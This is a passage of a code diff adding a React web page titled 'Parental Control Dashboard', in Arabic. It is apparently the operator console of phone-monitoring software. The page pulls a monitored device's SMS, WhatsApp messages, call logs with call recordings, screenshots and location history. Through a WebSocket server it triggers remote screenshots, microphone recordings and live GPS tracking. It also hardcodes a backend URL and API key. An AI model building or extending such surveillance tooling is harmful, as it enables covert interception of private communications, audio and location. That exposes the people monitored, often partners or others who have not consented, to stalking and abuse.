@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parental Control Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.22.5/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.43.4/dist/umd/supabase.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.6; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .custom-marker {
+            background: red;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
+
+        const supabase = window.supabase.createClient(
+            'https://hmtyhtyvfbcvimaeibpz.supabase.co',
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtdHlodHl2ZmJjdmltYWVpYnB6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNDM5ODksImV4cCI6MjA2MjYxOTk4OX0.a8IlF3XhD0YXQlwqyKdX1dNBI4gxaT7GcPlypr-dBJU'
+        );
+
+        const App = () => {
+            const [devices, setDevices] = useState([]);
+            const [selectedDevice, setSelectedDevice] = useState(null);
+            const [ws, setWs] = useState(null);
+            const [connectionStatus, setConnectionStatus] = useState("جارٍ الاتصال...");
+            const [messages, setMessages] = useState([]);
+            const [calls, setCalls] = useState([]);
+            const [commandResults, setCommandResults] = useState({});
+            const [screenshots, setScreenshots] = useState([]);
+            const [periodicScreenshots, setPeriodicScreenshots] = useState([]);
+            const [locations, setLocations] = useState([]);
+            const [audioRecordings, setAudioRecordings] = useState([]);
+            const [whatsAppMessages, setWhatsAppMessages] = useState([]);
+            const [liveLocation, setLiveLocation] = useState(null);
+            const [isTracking, setIsTracking] = useState(false);
+            const [mapType, setMapType] = useState("standard");
+            const mapRef = useRef(null);
+            const mapInstance = useRef(null);
+            const markerRef = useRef(null);
+            const timeIntervalRef = useRef(null);
+            const reconnectAttempts = useRef(0);
+            const maxReconnectAttempts = 10;
+            const baseReconnectDelay = 5000;
+            const pollingIntervalRef = useRef(null);
+            const selectedDeviceRef = useRef(null);
+
+            const isValidJSON = (str) => {
+                try {
+                    if (typeof str !== 'string') return false;
+                    const trimmed = str.trim();
+                    return (trimmed.startsWith('{') && trimmed.endsWith('}')) || 
+                           (trimmed.startsWith('[') && trimmed.endsWith(']'));
+                } catch (e) {
+                    return false;
+                }
+            };
+
+            const formatLocalTime = (isoString) => {
+                if (!isoString) return "غير متاح";
+                const date = new Date(isoString);
+                return date.toLocaleString('ar-EG', { 
+                    timeZone: 'Asia/Baghdad',
+                    hour12: false,
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+            };
+
+            const initializeMap = (lat, lng) => {
+                if (!mapRef.current) return;
+                if (mapInstance.current) {
+                    mapInstance.current.remove();
+                    mapInstance.current = null;
+                }
+                mapInstance.current = L.map(mapRef.current, { zoomControl: true }).setView([lat || 0, lng || 0], lat && lng ? 13 : 2);
+                
+                const standardLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    maxZoom: 19,
+                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+                });
+
+                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                    maxZoom: 19,
+                    attribution: 'Tiles © Esri — Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+                });
+
+                const baseMaps = {
+                    "خريطة عادية": standardLayer,
+                    "قمر صناعي": satelliteLayer
+                };
+
+                standardLayer.addTo(mapInstance.current);
+                L.control.layers(baseMaps).addTo(mapInstance.current);
+
+                const customIcon = L.divIcon({
+                    className: 'custom-marker pulse',
+                    html: '<div style="background: red; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">📍</div>',
+                    iconSize: [20, 20],
+                    iconAnchor: [10, 10]
+                });
+
+                markerRef.current = L.marker([lat || 0, lng || 0], { icon: customIcon, draggable: false })
+                    .addTo(mapInstance.current)
+                    .bindPopup('')
+                    .openPopup();
+                updatePopupTime();
+            };
+
+            const updateMap = (lat, lng) => {
+                if (mapInstance.current && markerRef.current) {
+                    const newLatLng = L.latLng(lat, lng);
+                    markerRef.current.setLatLng(newLatLng);
+                    mapInstance.current.setView(newLatLng, 13, { animate: true });
+                    updatePopupTime();
+                }
+            };
+
+            const updatePopupTime = () => {
+                if (markerRef.current) {
+                    markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(liveLocation ? liveLocation.captured_at : new Date().toISOString())}`);
+                }
+            };
+
+            const centerMapOnLocation = () => {
+                if (liveLocation && mapInstance.current) {
+                    mapInstance.current.setView([liveLocation.latitude, liveLocation.longitude], 13, { animate: true });
+                    updatePopupTime();
+                }
+            };
+
+            const startTimeUpdate = () => {
+                if (timeIntervalRef.current) clearInterval(timeIntervalRef.current);
+                timeIntervalRef.current = setInterval(() => {
+                    if (isTracking && mapInstance.current && markerRef.current) {
+                        updatePopupTime();
+                    }
+                }, 1000);
+            };
+
+            const stopTimeUpdate = () => {
+                if (timeIntervalRef.current) {
+                    clearInterval(timeIntervalRef.current);
+                    timeIntervalRef.current = null;
+                }
+            };
+
+            const fetchLocations = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('locations')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('captured_at', { ascending: false });
+                if (error) console.error('Error fetching locations:', error);
+                else setLocations(data.map(loc => ({
+                    latitude: loc.latitude,
+                    longitude: loc.longitude,
+                    captured_at: loc.captured_at,
+                    map_url: loc.map_url
+                })));
+            };
+
+            const fetchAudioRecordings = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('audio_recordings')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('timestamp', { ascending: false });
+                if (error) console.error('Error fetching audio recordings:', error);
+                else setAudioRecordings(data);
+            };
+
+            const fetchCalls = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('calls')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('timestamp', { ascending: false });
+                if (error) console.error('Error fetching calls:', error);
+                else setCalls(data);
+            };
+
+            const fetchMessages = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('messages')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('date', { ascending: false });
+                if (error) {
+                    console.error('Error fetching messages:', error);
+                    alert('فشل في جلب الرسائل: ' + error.message);
+                } else setMessages(data.map(msg => ({
+                    address: msg.address,
+                    content: msg.content,
+                    date: msg.date,
+                    type: msg.type,
+                    name: msg.contactName || 'غير متاح'
+                })));
+            };
+
+            const fetchWhatsAppMessages = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('whatsapp_messages')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('timestamp', { ascending: false });
+                if (error) {
+                    console.error('Error fetching WhatsApp messages:', error);
+                    alert('فشل في جلب رسائل WhatsApp: ' + error.message);
+                } else setWhatsAppMessages(data.map(msg => ({
+                    phoneNumber: msg.phone_number,
+                    contactName: msg.contact_name || 'غير متاح',
+                    content: msg.content || 'لا يوجد محتوى',
+                    isSent: msg.is_sent,
+                    timestamp: msg.timestamp
+                })));
+            };
+
+            const fetchScreenshots = async (deviceId) => {
+                if (!deviceId) return;
+                try {
+                    const { data, error } = await supabase
+                        .from('manual-screenshots')
+                        .select('*')
+                        .eq('device_id', deviceId)
+                        .order('captured_at', { ascending: false });
+                    if (error) console.error('Error fetching manual screenshots:', error.message, error.details);
+                    else setScreenshots(data);
+                } catch (e) {
+                    console.error('Unexpected error fetching screenshots:', e);
+                }
+            };
+
+            const fetchPeriodicScreenshots = async (deviceId) => {
+                if (!deviceId) return;
+                const { data, error } = await supabase
+                    .from('screenshots')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .eq('is_periodic', true)
+                    .order('captured_at', { ascending: false });
+                if (error) console.error('Error fetching periodic screenshots:', error);
+                else setPeriodicScreenshots(data);
+            };
+
+            const startPolling = () => {
+                if (pollingIntervalRef.current) return;
+                const pollingInterval = 30000;
+                pollingIntervalRef.current = setInterval(() => {
+                    if (ws && ws.readyState === WebSocket.OPEN) return;
+                    if (selectedDevice) {
+                        fetchMessages(selectedDevice.uuid);
+                        fetchCalls(selectedDevice.uuid);
+                        fetchScreenshots(selectedDevice.uuid);
+                        fetchPeriodicScreenshots(selectedDevice.uuid);
+                        fetchLocations(selectedDevice.uuid);
+                        fetchAudioRecordings(selectedDevice.uuid);
+                        fetchWhatsAppMessages(selectedDevice.uuid);
+                    }
+                }, pollingInterval);
+            };
+
+            const stopPolling = () => {
+                if (pollingIntervalRef.current) {
+                    clearInterval(pollingIntervalRef.current);
+                    pollingIntervalRef.current = null;
+                }
+            };
+
+            const connectWebSocket = () => {
+                if (reconnectAttempts.current >= maxReconnectAttempts) {
+                    setConnectionStatus("فشل الاتصال بالخادم نهائيًا، يرجى المحاولة لاحقًا");
+                    startPolling();
+                    return;
+                }
+                const socket = new WebSocket("wss://websocket-server-production-407b.up.railway.app");
+                setWs(socket);
+                console.log("Attempting to connect to WebSocket...");
+                socket.onopen = () => {
+                    console.log("WebSocket connection opened successfully");
+                    setConnectionStatus("متصل بالخادم");
+                    reconnectAttempts.current = 0;
+                    stopPolling();
+                    socket.send(JSON.stringify({ action: "dashboard_connect" }));
+                };
+                socket.onmessage = (event) => {
+                    console.log("Selected device:", selectedDeviceRef.current?.uuid);
+                    console.log("Received WebSocket message (raw):", event.data);
+                    if (isValidJSON(event.data)) {
+                        const data = JSON.parse(event.data);
+                        console.log("Parsed data:", data);
+                        if (data.action === "device_list") {
+                            setDevices(data.devices || []);
+                        } else if (data.action === "message_update" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            setMessages(prev => [...prev, { address: data.address, content: data.content || data.body, date: new Date(data.date).toISOString(), type: data.type, name: data.contactName || 'غير متاح' }]);
+                        } else if (data.action === "call_update" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            fetchCalls(data.deviceId);
+                        } else if (data.action === "command_result" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            setCommandResults(prev => ({ ...prev, [data.command]: data.result }));
+                            if (data.command === "take_screenshot") fetchScreenshots(data.deviceId);
+                        } else if (data.action === "periodic_screenshot" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            fetchPeriodicScreenshots(data.deviceId);
+                        } else if (data.action === "manual_screenshot" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            fetchScreenshots(data.deviceId);
+                        } else if (data.action === "audio_recording" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            setCommandResults(prev => ({ ...prev, ['record_audio']: data.audioUrl }));
+                            fetchAudioRecordings(data.deviceId);
+                        } else if (data.action === "live_location" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            console.log("Updating liveLocation:", data.latitude, data.longitude);
+                            if (data.latitude && data.longitude && !isNaN(parseFloat(data.latitude)) && !isNaN(parseFloat(data.longitude))) {
+                                const newLat = parseFloat(data.latitude);
+                                const newLng = parseFloat(data.longitude);
+                                if (newLat >= -90 && newLat <= 90 && newLng >= -180 && newLng <= 180) {
+                                    setLiveLocation({ latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() });
+                                    console.log("Updated liveLocation successfully:", newLat, newLng);
+                                } else {
+                                    console.error("Invalid coordinates out of range:", newLat, newLng);
+                                }
+                            } else {
+                                console.error("Invalid latitude or longitude received:", data.latitude, data.longitude);
+                            }
+                        } else if (data.action === "whatsapp_message_update" && selectedDeviceRef.current && data.deviceId === selectedDeviceRef.current.uuid) {
+                            setWhatsAppMessages(prev => [...prev, { phoneNumber: data.phoneNumber, contactName: data.contactName || 'غير متاح', content: data.content, isSent: data.isSent, timestamp: data.timestamp }]);
+                        } else if (data.action === "subscription_confirmed") {
+                            console.log("Subscription confirmed for device:", data.deviceId);
+                            const matchedDevice = devices.find(d => d.uuid === data.deviceId);
+                            if (matchedDevice && !selectedDeviceRef.current) {
+                                setSelectedDevice(matchedDevice);
+                                selectedDeviceRef.current = matchedDevice;
+                                console.log("Auto-selected device:", matchedDevice.uuid);
+                            }
+                        } else if (data.action === "subscription_error") {
+                            console.error("Subscription error:", data.message);
+                        } else {
+                            console.log("Unhandled message action:", data.action);
+                        }
+                    } else {
+                        console.error("Invalid JSON received:", event.data);
+                    }
+                };
+                socket.onclose = () => {
+                    console.log("WebSocket connection closed, attempting to reconnect...");
+                    setConnectionStatus("تم قطع الاتصال، جارٍ إعادة المحاولة...");
+                    setLiveLocation(null);
+                    reconnectAttempts.current += 1;
+                    startPolling();
+                    const delay = baseReconnectDelay * Math.pow(2, reconnectAttempts.current);
+                    setTimeout(connectWebSocket, delay);
+                };
+                socket.onerror = (error) => {
+                    console.error("WebSocket error:", error);
+                    setConnectionStatus("فشل الاتصال بالخادم");
+                    setLiveLocation(null);
+                    startPolling();
+                };
+            };
+
+            useEffect(() => {
+                connectWebSocket();
+                startPolling();
+                return () => {
+                    if (ws) ws.close();
+                    stopPolling();
+                    stopTimeUpdate();
+                    if (mapInstance.current) {
+                        mapInstance.current.remove();
+                        mapInstance.current = null;
+                    }
+                };
+            }, []);
+
+            useEffect(() => {
+                if (selectedDevice) {
+                    selectedDeviceRef.current = selectedDevice;
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ action: "subscribe_to_device", deviceId: selectedDevice.uuid }));
+                        console.log("Subscribed to device:", selectedDevice.uuid);
+                        if (mapInstance.current) {
+                            mapInstance.current.remove();
+                            mapInstance.current = null;
+                        }
+                        const lastLat = selectedDevice.latitude || 0;
+                        const lastLng = selectedDevice.longitude || 0;
+                        initializeMap(lastLat, lastLng);
+                        setLiveLocation(lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null);
+                    }
+                } else if (!selectedDevice && mapInstance.current) {
+                    mapInstance.current.remove();
+                    mapInstance.current = null;
+                }
+            }, [selectedDevice, ws]);
+
+            useEffect(() => {
+                console.log("liveLocation:", liveLocation, "isTracking:", isTracking);
+                if (liveLocation && mapInstance.current && markerRef.current && isTracking) {
+                    console.log("Updating map with live location:", liveLocation.latitude, liveLocation.longitude);
+                    updateMap(liveLocation.latitude, liveLocation.longitude);
+                    if (!mapInstance.current.getBounds().contains([liveLocation.latitude, liveLocation.longitude])) {
+                        mapInstance.current.setView([liveLocation.latitude, liveLocation.longitude], 13, { animate: true });
+                    }
+                } else if (mapInstance.current && markerRef.current && !isTracking && selectedDevice) {
+                    const lastLat = selectedDeviceRef.current?.latitude || 0;
+                    const lastLng = selectedDeviceRef.current?.longitude || 0;
+                    markerRef.current.setLatLng([lastLat, lastLng]);
+                    mapInstance.current.setView([lastLat, lastLng], lastLat && lastLng ? 13 : 2);
+                    updatePopupTime();
+                }
+            }, [liveLocation, isTracking, selectedDevice]);
+
+            useEffect(() => {
+                if (isTracking) {
+                    startTimeUpdate();
+                } else {
+                    stopTimeUpdate();
+                    if (markerRef.current) {
+                        markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(liveLocation ? liveLocation.captured_at : new Date().toISOString())}`);
+                    }
+                }
+            }, [isTracking, liveLocation]);
+
+            const selectDevice = (device) => {
+                setSelectedDevice(device);
+                setMessages([]);
+                setCalls([]);
+                setCommandResults({});
+                setScreenshots([]);
+                setPeriodicScreenshots([]);
+                setLocations([]);
+                setAudioRecordings([]);
+                setWhatsAppMessages([]);
+                setLiveLocation(null);
+                const lastLat = device.latitude || 0;
+                const lastLng = device.longitude || 0;
+                if (mapInstance.current) {
+                    mapInstance.current.remove();
+                    mapInstance.current = null;
+                }
+                initializeMap(lastLat, lastLng);
+                setLiveLocation(lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null);
+                fetchLocations(device.uuid);
+                fetchAudioRecordings(device.uuid);
+                fetchCalls(device.uuid);
+                fetchMessages(device.uuid);
+                fetchScreenshots(device.uuid);
+                fetchPeriodicScreenshots(device.uuid);
+                fetchWhatsAppMessages(device.uuid);
+            };
+
+            const sendCommand = (command) => {
+                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice) {
+                    const message = JSON.stringify({ action: command, deviceId: selectedDevice.uuid, duration: command === "record_audio" ? 15000 : undefined });
+                    ws.send(message);
+                    console.log("Sent command:", message);
+                } else console.error("WebSocket غير متصل أو لم يتم اختيار جهاز");
+            };
+
+            const startLiveTracking = () => {
+                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && !isTracking) {
+                    ws.send(JSON.stringify({ action: "start_live_tracking", deviceId: selectedDevice.uuid, duration: 300000 }));
+                    setIsTracking(true);
+                    const lastLat = selectedDeviceRef.current?.latitude || 0;
+                    const lastLng = selectedDeviceRef.current?.longitude || 0;
+                    setLiveLocation({ latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() });
+                    if (mapInstance.current) {
+                        mapInstance.current.removeLayer(markerRef.current);
+                        const customIcon = L.divIcon({
+                            className: 'custom-marker pulse',
+                            html: '<div style="background: red; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">📍</div>',
+                            iconSize: [20, 20],
+                            iconAnchor: [10, 10]
+                        });
+                        markerRef.current = L.marker([lastLat, lastLng], { icon: customIcon })
+                            .addTo(mapInstance.current)
+                            .bindPopup('')
+                            .openPopup();
+                    }
+                    console.log("Started live tracking for device:", selectedDevice.uuid);
+                }
+            };
+
+            const stopLiveTracking = () => {
+                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && isTracking) {
+                    ws.send(JSON.stringify({ action: "stop_live_tracking", deviceId: selectedDevice.uuid }));
+                    setIsTracking(false);
+                    setLiveLocation(null);
+                    if (mapInstance.current && markerRef.current) {
+                        const lastLat = selectedDeviceRef.current?.latitude || 0;
+                        const lastLng = selectedDeviceRef.current?.longitude || 0;
+                        markerRef.current.setLatLng([lastLat, lastLng]);
+                        mapInstance.current.setView([lastLat, lastLng], lastLat && lastLng ? 13 : 2);
+                        updatePopupTime();
+                    }
+                    console.log("Stopped live tracking for device:", selectedDevice.uuid);
+                }
+            };
+
+            return (
+                <div className="min-h-screen p-6">
+                    <div className="mb-4 text-lg font-semibold text-gray-800">
+                        حالة الاتصال: <span className={connectionStatus.includes("متصل") ? "text-green-500" : "text-red-500"}>{connectionStatus}</span>
+                    </div>
+                    {!selectedDevice ? (
+                        <div>
+                            <h1 className="text-3xl font-bold text-blue-700 mb-6">الأجهزة المراقبة</h1>
+                            {devices.length === 0 ? (
+                                <p className="text-gray-600">لا توجد أجهزة متاحة حاليًا...</p>
+                            ) : (
+                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                                    {devices.map((device) => (
+                                        <div
+                                            key={device.uuid}
+                                            onClick={() => {
+                                                try {
+                                                    console.log("Attempting to select device:", device.uuid);
+                                                    if (selectDevice) {
+                                                        selectDevice(device);
+                                                        console.log("Device selected successfully:", device.uuid);
+                                                    } else {
+                                                        console.error("selectDevice function is not defined!");
+                                                    }
+                                                } catch (error) {
+                                                    console.error("Error selecting device:", error);
+                                                }
+                                            }}
+                                            className="bg-white shadow-md rounded-lg p-4 cursor-pointer hover:bg-gray-50 transition duration-200"
+                                            style={{ touchAction: "manipulation" }}
+                                        >
+                                            <h2 className="text-xl font-semibold text-gray-800">جهاز {device.name || device.uuid}</h2>
+                                            <p className="text-gray-600">UUID: {device.uuid}</p>
+                                            <p className="text-lg">
+                                                الحالة: <span className={device.connected ? "text-green-500" : "text-red-500"}>
+                                                    {device.connected ? "متصل" : "غير متصل"}
+                                                </span>
+                                            </p>
+                                            <p className="text-gray-600">آخر اتصال: {formatLocalTime(device.lastConnected)}</p>
+                                        </div>
+                                    ))}
+                                </div>
+                            )}
+                        </div>
+                    ) : (
+                        <div>
+                            <button
+                                onClick={() => setSelectedDevice(null)}
+                                className="mb-4 bg-gray-500 text-white px-4 py-2 rounded-lg hover:bg-gray-600 transition duration-200"
+                            >
+                                العودة إلى قائمة الأجهزة
+                            </button>
+
+                            <div className="bg-white shadow-md rounded-lg p-6 mb-6">
+                                <h2 className="text-xl font-semibold text-gray-800 mb-2">حالة الجهاز</h2>
+                                <p className="text-lg">
+                                    الحالة: <span className={selectedDevice.connected ? "text-green-500" : "text-red-500"}>
+                                        {selectedDevice.connected ? "متصل" : "غير متصل"}
+                                    </span>
+                                </p>
+                                <p className="text-gray-600">آخر اتصال: {formatLocalTime(selectedDevice.lastConnected)}</p>
+                                <p className="text-gray-600">نسبة الشحن: {selectedDevice.batteryPercentage || "غير متاح"}%</p>
+                            </div>
+
+                            <div className="bg-white shadow-md rounded-lg p-6 mb-6">
+                                <h3 className="text-lg font-semibold text-gray-800 mb-4">تتبع الموقع المباشر</h3>
+                                <div className="flex space-x-4 mb-4">
+                                    <button
+                                        onClick={startLiveTracking}
+                                        disabled={isTracking}
+                                        className="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
+                                    >
+                                        بدء التتبع
+                                    </button>
+                                    <button
+                                        onClick={stopLiveTracking}
+                                        disabled={!isTracking}
+                                        className="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
+                                    >
+                                        إيقاف التتبع
+                                    </button>
+                                    <button
+                                        onClick={() => centerMapOnLocation()}
+                                        disabled={!liveLocation}
+                                        className="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
+                                    >
+                                        الرجوع إلى الموقع
+                                    </button>
+                                    <select
+                                        value={mapType}
+                                        onChange={(e) => setMapType(e.target.value)}
+                                        className="p-2 border rounded-lg"
+                                    >
+                                        <option value="standard">خريطة عادية</option>
+                                        <option value="satellite">قمر صناعي</option>
+                                    </select>
+                                </div>
+                                <div ref={mapRef} className="w-full h-96 rounded-lg overflow-hidden" style={{ position: 'relative' }}></div>
+                                {liveLocation && (
+                                    <p className="mt-2 text-gray-600">
+                                        آخر تحديث: {formatLocalTime(liveLocation.captured_at)}
+                                    </p>
+                                )}
+                            </div>
+
+                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
+                                <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 transition duration-200">
+                                    <h3 className="text-lg font-semibold text-gray-800">الرسائل</h3>
+                                    <button
+                                        onClick={() => fetchMessages(selectedDevice.uuid)}
+                                        className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                    >
+                                        تحديث الرسائل
+                                    </button>
+                                    {messages.length > 0 ? (
+                                        <div className="mt-4 overflow-x-auto">
+                                            <table className="min-w-full bg-white border border-gray-200 rounded-lg">
+                                                <thead>
+                                                    <tr className="bg-gray-100 border-b">
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">النوع</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الاسم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الرقم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">المحتوى</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">التاريخ</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    {messages.map((msg, index) => (
+                                                        <tr key={index} className="border-b hover:bg-gray-50 transition duration-200">
+                                                            <td className="py-2 px-4 text-right">{msg.type === 'sent' ? 'مرسلة' : msg.type === 'received' ? 'مستقبلة' : msg.type}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.name}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.address || 'غير متاح'}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.content || 'لا يوجد محتوى'}</td>
+                                                            <td className="py-2 px-4 text-right">{formatLocalTime(msg.date)}</td>
+                                                        </tr>
+                                                    ))}
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    ) : (
+                                        <p className="mt-2 text-gray-600">لا توجد رسائل متاحة.</p>
+                                    )}
+                                </div>
+                                <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 transition duration-200">
+                                    <h3 className="text-lg font-semibold text-gray-800">المكالمات</h3>
+                                    <button
+                                        onClick={() => fetchCalls(selectedDevice.uuid)}
+                                        className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                    >
+                                        تحديث المكالمات
+                                    </button>
+                                    {calls.length > 0 ? (
+                                        <div className="mt-4 overflow-x-auto">
+                                            <table className="min-w-full bg-white border border-gray-200 rounded-lg">
+                                                <thead>
+                                                    <tr className="bg-gray-100 border-b">
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">النوع</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الرقم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الاسم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">التاريخ</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">التسجيل</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    {calls.map((call, index) => (
+                                                        <tr key={index} className="border-b hover:bg-gray-50 transition duration-200">
+                                                            <td className="py-2 px-4 text-right">{call.call_type}</td>
+                                                            <td className="py-2 px-4 text-right">{call.phone_number || 'غير متاح'}</td>
+                                                            <td className="py-2 px-4 text-right">{call.contactName || 'غير متاح'}</td>
+                                                            <td className="py-2 px-4 text-right">{formatLocalTime(call.timestamp)}</td>
+                                                            <td className="py-2 px-4 text-right">
+                                                                {call.recording_url ? (
+                                                                    <div>
+                                                                        <audio controls className="mt-1 w-full">
+                                                                            <source src={call.recording_url} type="audio/mp4" />
+                                                                            Your browser does not support the audio element.
+                                                                        </audio>
+                                                                        <a href={call.recording_url} target="_blank" className="text-blue-500 ml-2">عرض</a>
+                                                                        <a href={call.recording_url} download className="text-blue-500 ml-2">تحميل</a>
+                                                                    </div>
+                                                                ) : (
+                                                                    <span className="text-gray-500 ml-2">لا يوجد تسجيل</span>
+                                                                )}
+                                                            </td>
+                                                        </tr>
+                                                    ))}
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    ) : (
+                                        <p className="mt-2 text-gray-600">لا توجد مكالمات متاحة.</p>
+                                    )}
+                                </div>
+                                <div className="bg-white shadow-md rounded-lg p-4 hover:bg-gray-50 transition duration-200">
+                                    <h3 className="text-lg font-semibold text-gray-800">رسائل WhatsApp</h3>
+                                    <button
+                                        onClick={() => fetchWhatsAppMessages(selectedDevice.uuid)}
+                                        className="mt-2 bg-blue-500 text-white px-3 py-1 rounded-lg hover:bg-blue-600 transition duration-200"
+                                    >
+                                        تحديث رسائل WhatsApp
+                                    </button>
+                                    {whatsAppMessages.length > 0 ? (
+                                        <div className="mt-4 overflow-x-auto">
+                                            <table className="min-w-full bg-white border border-gray-200 rounded-lg">
+                                                <thead>
+                                                    <tr className="bg-gray-100 border-b">
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الرقم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">الاسم</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">المحتوى</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">النوع</th>
+                                                        <th className="py-2 px-4 text-right text-gray-600 font-semibold">التاريخ</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    {whatsAppMessages.map((msg, index) => (
+                                                        <tr key={index} className="border-b hover:bg-gray-50 transition duration-200">
+                                                            <td className="py-2 px-4 text-right">{msg.phoneNumber || 'غير متاح'}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.contactName}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.content}</td>
+                                                            <td className="py-2 px-4 text-right">{msg.isSent ? 'مرسلة' : 'مستقبلة'}</td>
+                                                            <td className="py-2 px-4 text-right">{formatLocalTime(msg.timestamp)}</td>
+                                                        </tr>
+                                                    ))}
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    ) : (
+                                        <p className="mt-2 text-gray-600">لا توجد رسائل WhatsApp متاحة.</p>
+                                    )}
+                                </div>
